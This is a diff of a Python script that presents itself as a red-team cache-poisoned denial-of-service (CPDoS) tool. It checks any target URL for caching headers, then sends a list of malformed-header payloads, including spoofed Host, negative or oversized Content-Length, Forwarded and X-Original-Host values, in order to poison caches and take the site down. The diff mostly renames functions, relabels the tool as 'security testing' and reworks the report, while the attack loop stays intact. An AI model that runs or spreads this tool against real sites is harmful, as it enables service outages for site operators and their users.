@@ -1,19 +1,16 @@
 import sys
 import time
-import requests
 import json
+import requests
 
-LOG_FILE = "cpdos_detailed_log.json"
+LOG_FILE = "cpdos_report.json"
 
-# Advanced CPDoS Payloads
+# CPDoS Attack Payloads
 CPDOS_PAYLOADS = [
-    {"Host": "invalid.host", "Content-Length": "999999"},
-    {"Transfer-Encoding": "chunked", "Content-Length": "10"},
     {"Host": "127.0.0.1", "Content-Length": "0"},
     {"Content-Length": "-1"},
     {"Host": "..", "Content-Length": "100"},
-    {"Content-Length": "1000000"},
-    {"X-Original-Host": "bypass.cache", "Content-Length": "0"},
+    {"X-Original-Host": "bypass.cache", "Content-Length": "8"},
     {"Cache-Control": "no-store", "Content-Length": "100"},
     {"Referer": "http://malicious.site", "Content-Length": "10"},
     {"Forwarded": "for=127.0.0.1;by=cache-poison", "Content-Length": "99999"},
@@ -26,50 +23,55 @@ BANNER = """
 ██╔═══╝ ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
 ██║     ██║     ██║     ╚██████╔╝███████╗
 ╚═╝     ╚═╝     ╚═╝      ╚═════╝ ╚══════╝
-   CPDoS Testing Tool - Red Team
+   CPDoS Security Testing Tool - Red Team
 """
 
 CACHE_HEADERS = ["X-Cache", "Via", "Age", "CF-Cache-Status", "X-CDN-Cache", "X-Proxy-Cache"]
 
-def log_attack(target, results):
-    """Logs attack results in a structured JSON format."""
+def log_report(data):
+    """Save scan and attack results to a structured report."""
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    log_data = {
-        "timestamp": timestamp,
-        "target": target,
-        "results": results
-    }
+    data["timestamp"] = timestamp
+
     with open(LOG_FILE, "w") as log:
-        json.dump(log_data, log, indent=4)
-    print(f"[✔] Detailed log saved to {LOG_FILE}")
+        json.dump(data, log, indent=4)
 
-def check_cache(target):
-    """Scans for cache poisoning vulnerabilities."""
-    print("[*] Scanning for caching vulnerabilities...")
+    print(f"[✔] Report saved to {LOG_FILE}")
+
+def scan_cache_vulnerabilities(target):
+    """Check for caching vulnerabilities before attacking."""
+    print("[*] Scanning for cache vulnerabilities...")
+    vulnerabilities = {}
+
     try:
-        response = requests.get(target, timeout=5)
-        vulnerable_headers = {header: response.headers[header] for header in CACHE_HEADERS if header in response.headers}
+        response = requests.get(target, timeout=10)  # Increased timeout
+        vulnerable_headers = {header: response.headers.get(header, "Not Found") for header in CACHE_HEADERS}
 
-        if vulnerable_headers:
-            print("[✔] Caching detected! Potentially vulnerable headers:")
+        vulnerabilities["cache_headers"] = vulnerable_headers
+
+        if any(value != "Not Found" for value in vulnerable_headers.values()):
+            print("[✔] Caching detected! Possible vulnerabilities found.")
             for header, value in vulnerable_headers.items():
                 print(f"    [+] {header}: {value}")
-            return True
+            vulnerabilities["status"] = "Potentially Vulnerable"
         else:
             print("[✘] No caching detected. Attack may not work.")
-            return False
+            vulnerabilities["status"] = "No Cache Detected"
+
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] {e}")
-        return False
+        vulnerabilities["error"] = str(e)
 
-def launch_cpdos(target):
-    """Injects payloads and captures detailed responses."""
-    print("[*] Injecting payloads to disrupt site functionality...")
+    return vulnerabilities
+
+def exploit_cpdos(target):
+    """Exploit cache poisoning vulnerabilities using CPDoS payloads."""
+    print("[*] Attempting CPDoS attack on detected vulnerabilities...")
     results = []
     for i, payload in enumerate(CPDOS_PAYLOADS):
         print(f"[*] Sending CPDoS Payload {i+1}: {json.dumps(payload)}")
         try:
-            response = requests.get(target, headers=payload, timeout=5)
+            response = requests.get(target, headers=payload, timeout=10)  # Extended timeout
             response_details = {
                 "payload": payload,
                 "status_code": response.status_code,
@@ -90,23 +92,29 @@ def main(target):
     print(BANNER)
     print(f"[+] Target: {target}")
 
-    # Step 1: Check for cache vulnerabilities
-    if check_cache(target):
-        print("[✔] Cache poisoning attack can proceed.")
-    else:
-        print("[✘] Exiting. No cache vulnerabilities detected.")
+    # Step 1: Scan for vulnerabilities
+    cache_vulnerabilities = scan_cache_vulnerabilities(target)
+    
+    if cache_vulnerabilities.get("status") == "No Cache Detected":
+        print("[✘] No cache vulnerabilities found. Exiting...")
         sys.exit(1)
 
-    # Step 2: Inject payloads
-    attack_results = launch_cpdos(target)
+    # Step 2: Launch CPDoS attack
+    attack_results = exploit_cpdos(target)
 
-    # Step 3: Log results
-    log_attack(target, attack_results)
-    print("[✔] Attack complete. Check logs for details.")
+    # Step 3: Generate Report
+    report_data = {
+        "target": target,
+        "cache_scan": cache_vulnerabilities,
+        "attack_results": attack_results
+    }
+    
+    log_report(report_data)
+    print("[✔] Attack complete. Check report for details.")
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print("Usage: python cpdos.py <target_url>")
+        print("Usage: python cpdos_tester.py <target_url>")
         sys.exit(1)
 
     target_url = sys.argv[1]
